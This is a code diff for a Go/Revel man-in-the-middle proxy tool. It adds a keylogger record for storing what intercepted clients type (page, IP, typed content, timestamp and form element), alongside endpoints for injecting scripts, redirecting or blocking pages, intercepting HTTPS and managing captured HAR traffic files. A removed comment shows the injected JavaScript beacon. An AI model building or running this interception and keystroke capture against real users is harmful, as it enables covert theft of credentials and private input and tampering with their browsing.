@@ -4,7 +4,28 @@ import (
 	"github.com/revel/revel"
 	"log"
 	"io/ioutil"
+	"os"
+	"path/filepath"
 )
+
+//the temporary object that stores the logged data.
+//probably should store to file for persistence
+var data []KeyLog
+//key logger object
+type KeyLog struct {
+	Page string //what page they were on when they typed it
+	IP string //which client typed it
+	Content string //what was typed
+	Timestamp string //the time at which it was typed
+	DomObject string //where the data was typed
+}
+/*
+struct for storing result from a filePath Walker
+so that can return it to the user.
+*/
+type Walker struct {
+	files []string
+}
 
 type App struct {
 	*revel.Controller
@@ -32,18 +53,20 @@ func (c App) InjectScript() revel.Result {
 }
 func (c App) PassThrough() revel.Result {
 	KillProxy()
+	log.Println("A Simple Pass through of all information")
 	listener = PassThrough()
 	return c.RenderJson("")
 }
-func (c App) ReplacePage() revel.Result {
+func (c App) RedirectPage() revel.Result {
 	KillProxy()
-	listener = ReplacePage()
-	return c.RenderJson("")
+	log.Println("replacing...")
+	listener = RedirectPage()
+	return c.RenderJson(replace)
 }
 func (c App) BlockWebsites() revel.Result {
 	KillProxy()
 	listener = BlockWebsites()
-	return c.RenderJson("")
+	return c.RenderJson(banned)
 }
 
 func KillProxy() {
@@ -51,20 +74,23 @@ func KillProxy() {
 		listener.Close()		
 	}
 }
-var data []string
 
 func (c App) GetData() revel.Result {
 	return c.RenderJson(data)
 }
+
 func (c App) AppendData() revel.Result {
-	//window.setInterval(function(){var d = new Date()%3Bvar n = d.getTime()%3B$.get( "http://127.0.0.1:9000/data?time="+n, function( data ) {})%3B}, 1000)%3B
 	var d string
+	var p string
 	c.Params.Bind(&d, "data")
+	c.Params.Bind(&p, "page")
 	if d != "" {
-		data = append(data, d)
+		var k KeyLog
+		k.Page = p
+		k.Content = d
+		data = append(data, k)
 		return c.RenderJson("updated")
 	}	
-	// log.Println("data: ", data)
 	return c.RenderJson("null")
 }
 
@@ -76,17 +102,12 @@ func (c App) InterceptHTTPS() revel.Result {
 
 }
 
-// //an end point that shows what they see on a url
-// func (c App) Show() revel.Result {
-// 	//needs to get the response and render html
-// 	c.Render()
-// }
-
+//annoying cant use the file walker here - seems to have different header if I do
+//which means it gets downloaded rather than displayed														
 func (c App) GetHars() revel.Result {
 	var fileNames []string
 	log.Println("reading hars")
 	files, err := ioutil.ReadDir("/Users/alex/go/src/mitm/public/hars/")
-	log.Println(files)
 	if err != nil {
 		log.Println("error: ", err)
 	}
@@ -96,7 +117,26 @@ func (c App) GetHars() revel.Result {
     }
 	return c.RenderJson(fileNames)
 }
+func (c App) DeleteHars() revel.Result {
+	var w Walker
+	filepath.Walk(SOURCE+"/hars", w.deletefiles)
+	return c.RenderJson(w.files)
+}
 
 func (c App) Index() revel.Result {
+	initializeBlockReplaceLists()
 	return c.Render()
 }
+
+ func (w *Walker) deletefiles(path string, f os.FileInfo, err error) (e error) {
+
+ 	//must check for the directory otherwise end up deleting it!
+ 	if !f.Mode().IsDir() {
+ 		 log.Println(path)
+ 		 w.files = append(w.files, path)
+ 	}
+
+ 	//put this back in when you actually do want to clear the currently collected list
+ 	// os.Remove(path)
+ 	return 
+ }
